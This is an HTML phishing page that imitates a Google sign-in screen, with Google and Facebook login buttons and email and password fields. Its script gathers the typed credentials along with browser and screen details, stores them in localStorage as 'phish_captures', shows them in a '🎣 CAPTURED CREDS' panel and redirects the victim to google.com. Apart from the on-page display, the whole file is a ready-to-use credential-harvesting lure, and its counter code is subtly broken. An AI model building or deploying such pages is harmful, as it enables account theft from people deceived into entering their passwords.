<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.login{background:#fff;max-width:400px;width:100%;border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,.15);overflow:hidden}.header{padding:30px 30px 0;text-align:center}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:8px}.logo svg{width:48px;height:48px}.logo-title{font-size:26px;font-weight:600;color:#202124}.subtitle{color:#5f6368;font-size:14px;margin-bottom:24px}.form{padding:0 30px 30px}.input-group{margin-bottom:20px}.label{font-size:14px;color:#3c4043;margin-bottom:6px;display:block}.input{width:100%;padding:14px;border:2px solid #dadce0;border-radius:8px;font-size:16px;transition:.2s}.input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 3px rgba(66,133,244,.1)}.oauth{display:flex;gap:12px;margin-bottom:24px}.oauth-btn{flex:1;padding:12px;border:none;border-radius:8px;font-size:14px;font-weight:500;cursor:pointer;transition:.2s;color:#fff;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px}.google{background:#4285f4}.facebook{background:#1877f2}.oauth-btn:hover{opacity:.9}.divider{display:flex;align-items:center;margin:24px 0;color:#9aa0a6;font-size:14px}.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dadce0}.submit{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:.2s}.submit:hover{background:#3367d6;transform:translateY(-1px)}.creds{position:fixed;top:20px;right:20px;background:rgba(0,0,0,.9);color:#fff;padding:20px;border-radius:8px;max-width:300px;display:none;font-size:14px;z-index:9999;max-height:80vh;overflow:auto}.creds.show{display:block}</style></head><body><div class="login"><div class="header"><div class="logo"><svg viewBox="0 0 24 24"><path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fbbc04" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg><div><div class="logo-title">Sign in</div><div class="subtitle">to continue to your account</div></div></div></div><div class="form"><div class="oauth"><a href="#" class="oauth-btn google" onclick="capture('Google')">Continue with Google</a><a href="#" class="oauth-btn facebook" onclick="capture('Facebook')">Continue with Facebook</a></div><div class="divider"><span>or</span></div><div class="input-group"><label class="label">Email</label><input type="email" id="email" class="input" placeholder="name@example.com"></div><div class="input-group"><label class="label">Password</label><input type="password" id="pass" class="input" placeholder="Password"></div><button class="submit" onclick="capture('Email')">Sign In</button></div></div><div id="creds" class="creds"><h3>🎣 CAPTURED CREDS</h3><div id="creds-list"></div></div><script>let captures=[];function capture(type){const email=document.getElementById('email').value||'N/A';const pass=document.getElementById('pass').value||'N/A';const cred={id:++captures.length,time:new Date().toLocaleString(),type:type,email:email,password:pass,ua:navigator.userAgent.slice(0,100),screen:`${screen.width}x${screen.height}`};captures.unshift(cred);localStorage.setItem('phish_captures',JSON.stringify(captures.slice(0,50)));showCred(cred);setTimeout(()=>{window.location.href='https://google.com';},1500);}function showCred(cred){const credsDiv=document.getElementById('creds');const list=document.getElementById('creds-list');const entry=document.createElement('div');entry.style.cssText='margin:10px 0;padding:12px;background:rgba(255,255,255,.1);border-radius:6px;font-family:monospace;font-size:13px';entry.innerHTML=`<strong>${cred.type}</strong> | ${cred.time}<br>Email: <span style="color:#4ade80">${cred.email}</span><br>Pass: <span style="color:#f87171">${cred.password}</span><br>Device: ${cred.ua}<br>Screen: ${cred.screen}`;list.insertBefore(entry,list.firstChild);credsDiv.classList.add('show');setTimeout(()=>{credsDiv.classList.remove('show');},5000);}</script></body></html>
